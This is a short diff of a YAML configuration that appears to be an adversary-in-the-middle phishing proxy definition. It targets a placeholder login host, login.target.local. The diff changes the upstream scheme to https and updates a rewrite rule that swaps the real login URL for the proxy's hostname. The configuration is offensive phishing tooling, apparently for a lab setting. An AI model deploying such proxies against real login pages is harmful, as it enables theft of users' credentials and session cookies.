@@ -11,12 +11,12 @@ proxy_hosts:
     orig_sub:  login
     domain:    target.local
     is_landing: true
-    upstream_scheme: http
+    upstream_scheme: https
 
 sub_filters:
   - hostname:   login.target.local
     mime_types: [text/html, text/javascript, application/javascript]
-    search:     'http://login\.target\.local'
+    search:     'https://login\.target\.local'
     replace:    'https://{hostname}'
   - hostname:   login.target.local
     mime_types: [text/html, text/javascript, application/javascript]
